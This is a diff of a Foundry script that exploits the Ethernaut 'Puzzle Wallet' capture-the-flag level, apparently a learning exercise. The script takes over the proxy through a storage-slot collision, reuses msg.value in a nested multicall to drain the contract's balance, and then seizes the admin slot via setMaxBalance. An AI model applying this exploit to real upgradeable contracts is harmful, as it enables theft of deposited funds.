@@ -9,43 +9,43 @@ contract PuzzleWalletScript is Script {
 
     function run() public {
         uint256 privateKey = vm.envUint("PRIVATE_KEY");
-        address player = vm.addr(privateKey);
 
         vm.startBroadcast(privateKey);
 
-        address puzzleProxyAddress = 0xca45C9DFfDc4A8A1f6dbF1B574c139ce6Bdc50AC;
+        address puzzleProxyAddress = 0x86dF37FbBaD53E4EC2Af680495a42536F70CBE7C;
         
         // PuzzleProxy contract
         IPuzzleProxy puzzleProxy = IPuzzleProxy(puzzleProxyAddress);
 
+        // admin of the PuzzleProxy is the deployer
         console.log("PuzzleProxy Admin:", puzzleProxy.admin());
         console.log("PuzzleProxy Pending Admin:", puzzleProxy.pendingAdmin());
 
         // PuzzleProxy delegatecall to PuzzleWallet so it behaves like PuzzleWallet
         PuzzleWallet puzzleProxyWallet = PuzzleWallet(puzzleProxyAddress);
-        address proxyOwner = puzzleProxyWallet.owner();
 
-        console.log("PuzzleProxy Owner:", proxyOwner);
-        console.log("PuzzleProxy Owner Balance:", puzzleProxyWallet.balances(proxyOwner));
+        // owner of the PuzzleWallet is the admin
+        console.log("PuzzleProxy Owner:", puzzleProxyWallet.owner());
         console.log("PuzzleProxy Max balance:", puzzleProxyWallet.maxBalance());
-        console.log("PuzzleProxy Owner whitelisted:", puzzleProxyWallet.whitelisted(proxyOwner));
 
-        // implementation address is stored in implementationSlot
-        bytes32 implementationSlot = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
+        // // implementation address is stored in implementationSlot
+        // bytes32 implementationSlot = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
 
-        bytes32 implementationBytes32 = vm.load(address(puzzleProxyWallet), implementationSlot);
-        address implementationAddress = address(uint160(uint256(implementationBytes32)));
+        // bytes32 implementationBytes32 = vm.load(address(puzzleProxyWallet), implementationSlot);
+        // address implementationAddress = address(uint160(uint256(implementationBytes32)));
 
-        console.log("Implementation Address:", implementationAddress);
+        // console.log("Implementation Address:", implementationAddress);
 
-        // implementation is the actual PuzzleWallet contract
-        PuzzleWallet implementation = PuzzleWallet(implementationAddress);
+        // // implementation is the actual PuzzleWallet contract
+        // PuzzleWallet implementation = PuzzleWallet(implementationAddress);
 
-        // implementation is not initialized yet though it doesn't matter
-        console.log("Implementation Owner:", implementation.owner());
-        console.log("Implementation tMax balance:", implementation.maxBalance());
+        // // implementation is not initialized yet though it doesn't matter
+        // console.log("Implementation Owner:", implementation.owner());
+        // console.log("Implementation tMax balance:", implementation.maxBalance());
 
         // propose new admin
+        address player = vm.addr(privateKey);
+
         puzzleProxy.proposeNewAdmin(player);
 
         // owner of the PuzzleWallet changes to player
@@ -54,29 +54,33 @@ contract PuzzleWalletScript is Script {
         // add player to whitelist
         puzzleProxyWallet.addToWhitelist(player);
 
-        console.log("PuzzleProxy Owner whitelisted:", puzzleProxyWallet.whitelisted(player));
+        // player is whitelisted
+        console.log("PuzzleProxy Player whitelisted:", puzzleProxyWallet.whitelisted(player));
 
-        // withdraw funds from the contract
-        uint256 balanceToSteal = address(puzzleProxyWallet).balance;
+        // check balance of the PuzzleProxy
+        uint256 puzzleProxyBalance = address(puzzleProxyWallet).balance;
 
-        console.log("Balance to steal:", balanceToSteal);
+        console.log("PuzzleProxy Balance:", puzzleProxyBalance);
 
-        // execute multicall to withdraw funds
+        // deposit and execute data
         bytes memory depositData = abi.encodeWithSelector(puzzleProxyWallet.deposit.selector);
-        bytes memory executeCall = abi.encodeWithSelector(puzzleProxyWallet.execute.selector, player, balanceToSteal * 2, "");
+        bytes memory executeData = abi.encodeWithSelector(puzzleProxyWallet.execute.selector, player, puzzleProxyBalance * 2, "");
         
+        // nested multicall data
         bytes[] memory multicallData = new bytes[](1);
         multicallData[0] = depositData;
 
+        // multicall data
         bytes[] memory data = new bytes[](3);
-
         data[0] = abi.encodeWithSelector(puzzleProxyWallet.multicall.selector, multicallData);
         data[1] = depositData;
-        data[2] = executeCall;        
+        data[2] = executeData;        
 
-        puzzleProxyWallet.multicall{value: balanceToSteal}(data);
+        // multicall with puzzleProxyBalance
+        puzzleProxyWallet.multicall{value: puzzleProxyBalance}(data);
 
-        console.log("Balance after steal:", address(puzzleProxyWallet).balance);
+        // balance of the PuzzleProxy should be 0
+        console.log("PuzzleProxy Balance After multicall:", address(puzzleProxyWallet).balance);
 
         // setMaxBalance to player
         puzzleProxyWallet.setMaxBalance(uint256(uint160(player)));
@@ -87,3 +91,4 @@ contract PuzzleWalletScript is Script {
         vm.stopBroadcast();
     }
 }
+
